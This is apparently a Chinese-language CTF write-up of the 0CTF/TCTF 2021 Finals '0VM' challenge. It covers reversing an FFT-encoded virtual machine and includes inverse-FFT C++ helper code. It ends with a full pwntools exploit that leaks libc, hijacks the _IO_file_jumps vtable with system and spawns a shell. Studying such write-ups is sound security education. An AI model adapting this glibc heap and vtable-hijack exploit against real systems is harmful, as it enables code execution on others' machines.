# 0CTF/TCTF 2021 Finals 0VM

阅读量 **154146**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-21 16:30:28

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

这道题目，是一个虚拟机的题目，比较难，使用了一种算法。

## 1.逆向部分

![](https://p1.ssl.qhimg.com/t014210ad9176985db5.png)

可以看到，题目突然来了一个这个，有点懵逼。

![](https://p1.ssl.qhimg.com/t015be1bab3b615d2d5.png)

可以看到，这是一个`switch case`的操作，我们直接使用IDA自带的工具即可。

后面有一个FFT【傅里叶变换】，本着学习的态度，我们来学习一个傅里叶变换以及其逆变换

###  1.1 快速傅里叶变换

FFT是一种计算方法， 能够将O(n^2)的时间复杂度，变为了`O(nlogn)`，将一个多项式乘积转变为矩阵点乘。

知道了大概意思之后，我们开始寻找如何逆回去。网上搜索逆`FFT`也就是`IFFT`,但是由于对类型的处理不当。

我们可以看到这篇博客[(33条消息) 快速傅里叶变换_sky123博客-CSDN博客](https://sky123.blog.csdn.net/article/details/120213359)，使用其中的C++代码，如下：

    
    
    #include<bits/stdc++.h>
    using namespace std;
    const int N = 3e6 + 10;
    const double PI = acos(-1);
    
    struct Complex {
        double x, y;
    
        Complex operator+(const Complex &t) const {
            return {x + t.x, y + t.y};
        }
    
        Complex operator-(const Complex &t) const {
            return {x - t.x, y - t.y};
        }
    
        Complex operator*(const Complex &t) const {
            return {x * t.x - y * t.y, x * t.y + y * t.x};
        }
    };
    
    int rev[N], bit, tot;
    
    inline void init(int n) {
        bit = __lg(n) + ((n & (-n)) != n), tot = 1 << bit;
        for (int i = 0; i < tot; i++)
            rev[i] = (rev[i >> 1] >> 1) | ((i & 1) << (bit - 1));
    }
    
    inline void FFT(Complex a[], int inv) {
        for (int i = 0; i < tot; i++)
            if (i < rev[i])swap(a[i], a[rev[i]]);
        for (int mid = 1; mid < tot; mid <<= 1) {
            Complex w1 = {cos(PI / mid), inv * sin(PI / mid)};
            for (int i = 0; i < tot; i += mid * 2) {
                Complex wk = {1, 0};
                for (int j = 0; j < mid; j++, wk = wk * w1) {
                    auto x = a[i + j], y = wk * a[i + j + mid];
                    a[i + j] = x + y, a[i + j + mid] = x - y;
                }
            }
        }
    }
    
    int n, m;
    Complex a[N], b[N];
    
    int main() {
        scanf("%d%d", &n, &m);
        for (int i = 0; i <= n; i++)scanf("%lf", &a[i].x);
        for (int i = 0; i <= m; i++)scanf("%lf", &b[i].x);
        init(n + m + 1);
        FFT(a, 1), FFT(b, 1);
        for (int i = 0; i < tot; i++)a[i] = a[i] * b[i];
        FFT(a, -1);
        for (int i = 0; i <= n + m; i++)
            printf("%d%c", int(a[i].x / tot + 0.5), i == n + m ? '\n' : ' ');
        return 0;
    }
    

可以看到，在`main`函数中：

  * 首先输入了两个多项式
  * 然后对两个多项式进行`FFT`变换，然后进行乘积
  * 乘积结束之后，使用`IFFT`将其转换为多项式

然后我们来看一下`0VM IDA`的代码：

![](https://p4.ssl.qhimg.com/t014b877d975907c23d.png)

![](https://p3.ssl.qhimg.com/t016e848f0ed0858ec5.png)

  
可以看到，要求我们输入了一个多项式，然后对其进行`FFT`变换。

![](https://p4.ssl.qhimg.com/t01c008d6f592db098d.png)

然后由于精度的原因，使用`lround`对实部进行取整操作。那么现在我们可以使用上面那个模板的`IFFT`。我们只要先对我们需要输入的数据，进行`IFFT`操作，之后`0VM`会对我们的数据进行`FFT`，这样之后，我们就可以得到我们想要输入的数据。但是进行`IFFT`操作有以下问题：

  * `IFFT`操作是`C++`写的，但是我们的`exp`是用`Python`写的 
    * 答：可以使用`wrapper`，也即`python`调用`C++`，并得到它的输出
  * 我们如何将一个`double`类型的数据，以`%p`的形式输出： 
    * 答：先得到它的`void *`类型的指针，然后将其转化为`long long *`类型的操作，之后进行取值`*`操作。

得到`IFFT`的`main`函数如下：

    
    
    int main() {
        n = 64;
        m = 64;
    
        for (int i = 0; i < n; i++){
            scanf("%lf", &a[i].x);
        }
    
        init(n);
    
        FFT(a, -1);
    
        for (int i = 0; i < 64; i++)
        {
            void * res = (void *)&a[i].x;
            printf("%p\n", *(long long *)res);
        }
        return 0;
    }
    

这样便可以得到了

###  1.2 虚拟机逆向

经过上面的分析，我们可以控制虚拟机的指令，下面我们来把这个虚拟机给逆向出来。

下面我们来分析一下我们逆向的结果：

![](https://p0.ssl.qhimg.com/t019cf705789fc17b20.png)

  * `vm_mov_r_op`：是将一个寄存器【全局变量，抽象为寄存器】，写入任意一个值
  * `vm_mov_mm_r`：将寄存器的值写入到`mmap_addr[index]`中，要求对应的`mask`为`1`
  * `vm_mov_r_mm`：将`mmap_addr[index]`对应的值写入到对应的寄存器中。
  * `vm_add_r_r`：是将两个寄存器相加，返回到`rax`中。
  * `vmf`
    * `case 1`：输出`mmap`中对应的值，要求对应的`mask`为`1`
    * `case 2`：申请内存以及类似的`free`功能 
      * 如果`mmap_addr`中没有对应的值，则分配堆块
      * 如果有对应的值，则置第一个不为0的`mask[i]`为`1`. 
        * 这里可以通过多次操作，使其`mask`为1
  * `case 3`：链入堆块，随便链进。但是这里的`mask`需要为0 
    * 有一个很奇怪的地方，这里是先将`mask`置为0，然后进行判断的。说明这里存在一个漏洞，可以将某一地址进行写`0`操作。

其他需要注意点的

  * `index`为`offset`的后8位
  * `mask`为`mask = (unsigned int)offset / (16 * index);`
    * 【可以控制，注意offset是`int`】
  * 在除`vmf2`之外的函数都是通过`前32位`表示index，`后32位`表示距离`mmap_ptr`的偏移【而`mask`是和偏移相对应的】。
  * `vmf2`：个人理解为一个类似于`free&add`的操作，也是通过一个`offset`同时表示的`index`和`mask`的。

## 2.漏洞利用

经过我们前面的分析目前我们已知一个漏洞：

  * 能在`mask`为0的条件下，写限制范围内地址为0.

可以看到，这个漏洞很难用，肯定是要与其他漏洞配合使用的。

我们这里注意一下，这里有一个链表操作，而且不管是取链和入链操作都没有置`0`。很自然的可以想到直接泄露地址。

根据`vm3`链尾入链的操作，可以很自然的想到将尾链中的地址写一个值，这样可以造成任意地址写一个特定值【一般来说这中操作类似于`large bin
attack`，如果这里成立的话，一般情况下，我们可以使用`house of banana`等其他操作来`getshell`了】。

但是这里写值的时候，发现这里的`mask`置0了，也就是我们无法写了。

这时候我们可以想到第一个漏洞，写限制范围内地址为`0`。

复现的时候这里卡了很久…..。

其实这里的限制地址写`0`，可以部分写，不需要8字节对齐，这样，我们可以部分写我们的倒数第二条尾链，使其指向我们构造好的地址，这样便可以往任意地址写一个特定值了。

我们在上面提到过，可以使用`house of
banana`的操作，来进行`getshell`，并且题目显示调用`exit()`，理论上是可行的，但是由于题目限制输入比较多，可能会比较麻烦，有兴趣的小伙伴可以试试。

这里我们使用另外一种方法：往`mmap_addr`中写入一个地址，这样可以伪造一个结构体，进而造成任意地址写。

任意写之后，就简单了，不加说明了。

`EXP`如下：

    
    
    #-*- coding:utf8 -*-    from pwn import *
    # import numpy as np
    import subprocess
    import math
    context.os="linux"
    context.arch="amd64"
    context.word_size=64
    context.endian="little"
    context.log_level="debug"
    #context.terminal = ['tmux', 'splitw', '-v']
    local = True
    pc="./0VM"
    libc_mote = "/home/tzz/pwn16/libc-2.23.so"
    ld_mote = "/home/tzz/pwn16/ld-2.23.so"
    elf = ELF(pc)
    remote_addr=["123.123.123.123",12345]
    ru = lambda x : p.recvuntil(x)
    sn = lambda x : p.send(x)
    rl = lambda   : p.recvline()
    sl = lambda x : p.sendline(x)
    rv = lambda x : p.recv(x)
    sa = lambda a,b : p.sendafter(a,b)
    sla = lambda a,b : p.sendlineafter(a,b)
    h64 = lambda :u64(p.recvn(6).ljust(8,"\x00"))
    l64 = lambda :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
    l32 = lambda :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
    s64 = lambda :int(p.recvline()[:-1],16)#string about
    lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
    shell= lambda :p.interactive()
    p=None
    if local==True:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p=process(pc)
        #gdb.attach(("127.0.0.1", 1234), "set sysroot ./root", exe="./channel")
    
        #gdb.attach(p, "b *'$'rebase(0xdd9)")
    else:
        p=remote(remote_addr[0],remote_addr[1])
        libc = ELF(libc_mote)
    
    def wrap(choice,arg1,arg2,arg3):
        cmd = "./IFFT"
        tmp = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        lines = ""
        lines+= str(choice)+" "
        lines+= str(arg1)+" "
        lines+= str(arg2)+" "
        lines+= str(choice)+" "
        # print(hex(arg3))
        for i in range(8):
            t = str((arg3 >> (i*8))&0xff )+" "
            # print(t)
            lines+= t#str((arg3 > (i*8))&0xff )+" "
        for i in range(64-4-8):
            lines+= str(0)+" "
        tmp.stdin.write(lines)
        out = tmp.communicate()
        res = out[0].split("\n")
        res1 =""
        for i in range(64):
            if(res[i]=="(nil)"):
                res1 = res1+p64(0)
                continue
            res1 = res1+ p64(int(res[i],16))
            # sn()
        sn(res1)
    
    
    def vm_mov_r_op(r,value):
        # if(value=="/bin/sh\x00"):
        wrap(math.log(2,2),r,0, value)
    
    def vm_mov_mm_r(offset,r):
        wrap(math.log(3,2), r, 0, offset)
    
    def vm_mov_r_mm(r,offset):
        wrap(math.log(4,2), r, 0, offset)
    
    def vm_add_r_r(r1, r2):
        wrap(math.log(5,2), r1, r2, 0)
    
    def write(offset):
        wrap(math.log(0xa0,2), 1, 0, offset)
    
    def vmf2(offset):#malloc & free
        wrap(math.log(0xa0,2), 2, 0, offset)
    
    def vmf3(offset):#add 
        wrap(math.log(0xa0,2), 3, 0, offset)
    
    
    
    if __name__ == "__main__":
        ru("  ###     ###     ###      #    #     #")
    
        index = 0x4
        vmf2(4<<4) 
        for i in range(0x10):
            vmf2(4<<4)
        offset1 = 4<<32 |0x40 #mask = 1 head.l = 1  
        vmf3(offset1)
        offset2 = 4<<32 |0x80 #mask = 2 head.l = 0x80 
        vmf3(offset2)
    
        #free; set = mask = 1 
        vmf2(0x40)
        write(4<<32 |0x40)
        libc_addr =  l64()-0x34d080
        lg("libc_addr")
        addr =libc_addr + 0x37a000
    
    
        #target_index = 0x5 ; 0x7f342f890028
        target_addr = addr + 0x28
        offset1 = 4<<32 | 0x180 #mask = 6
        vmf3(offset1)       # 080 -> 180 ->0
        offset4 = 4<<32 | 0x40 
        vmf3(offset4)       # 080 -> 180 ->40
        vm_mov_r_op(1, target_addr)
        offset2 = 4<<32 | 0x100
        vm_mov_mm_r(offset2, 1)
        #off_by_one
        offset3 = 4<<32 | 0x79
        vmf3(offset3)       # 080 -> 180 ->40
        # write addr in target_addr
        offset1 = 4<<32 | 0x200
        vmf3(offset1)       # 080 -> 180 ->40->0x200
        #free in order to write head+mmap_ptr+mask
        for i in range(4):
            vmf2(0x40)
        stderr =  libc_addr + libc.sym["_IO_2_1_stderr_"]
        vtable = libc_addr + libc.sym["_IO_file_jumps"]#0x18 to write
        system = libc_addr + libc.sym["system"]
        #write mmap_ptr
        vm_mov_r_op(1,vtable)
        offset =  4<<32 | 0x200
        vm_mov_mm_r(offset, 1)
    
        #write mask
        vm_mov_r_op(1,0x0101010101010101)
        offset = 4<<32 | 0x210
        vm_mov_mm_r(offset, 1)
    
        # write system in vtable
        vm_mov_r_op(1,system)
        offset = 5<<32 | 0x18
        vm_mov_mm_r(offset, 1)
    
    
        #write binsh
        vm_mov_r_op(1,stderr)
        offset =  4<<32 | 0x200
        vm_mov_mm_r(offset, 1)
        binsh = 0x68732f6e69622f
        vm_mov_r_op(1,binsh)
        offset = 5<<32 | 0
        vm_mov_mm_r(offset, 1)
        # broke buf
        vm_mov_r_op(1,1)
        offset =  5<<32 | 0x20
        vm_mov_mm_r(offset, 1)
    
        #exit
        wrap(math.log(0xa0,2), 4, 0, 0)
    
        p.interactive()
    

`wrapper`如下：

    
    
    #include<bits/stdc++.h>
    using namespace std;
    const int N = 3e6 + 10;
    const double PI = acos(-1);
    
    struct Complex {
        double x, y;
    
        Complex operator+(const Complex &t) const {
            return {x + t.x, y + t.y};
        }
    
        Complex operator-(const Complex &t) const {
            return {x - t.x, y - t.y};
        }
    
        Complex operator*(const Complex &t) const {
            return {x * t.x - y * t.y, x * t.y + y * t.x};
        }
    };
    
    int rev[N], bit, tot;
    
    inline void init(int n) {
        bit = __lg(n) + ((n & (-n)) != n), tot = 1 << bit;
        for (int i = 0; i < tot; i++)
            rev[i] = (rev[i >> 1] >> 1) | ((i & 1) << (bit - 1));
    }
    
    inline void FFT(Complex a[], int inv) {
        for (int i = 0; i < tot; i++)
            if (i < rev[i])swap(a[i], a[rev[i]]);
        for (int mid = 1; mid < tot; mid <<= 1) {
            Complex w1 = {cos(PI / mid), inv * sin(PI / mid)};
            for (int i = 0; i < tot; i += mid * 2) {
                Complex wk = {1, 0};
                for (int j = 0; j < mid; j++, wk = wk * w1) {
                    auto x = a[i + j], y = wk * a[i + j + mid];
                    a[i + j] = x + y, a[i + j + mid] = x - y;
                }
            }
        }
    }
    
    int n, m;
    Complex a[N], b[N];
    
    int main() {
        n = 64;
        m = 64;
    
        for (int i = 0; i < n; i++){
            scanf("%lf", &a[i].x);
        }
    
        init(n);
    
        FFT(a, -1);
    
        for (int i = 0; i < 64; i++)
        {
            void * res = (void *)&a[i].x;
            printf("%p\n", *(long long *)res);
        }
        return 0;
    }
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **tzz** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/254814](/post/id/254814)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __4赞

 __收藏

![](https://p3.ssl.qhimg.com/t011ab0897092f99d1b.png) tzz

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

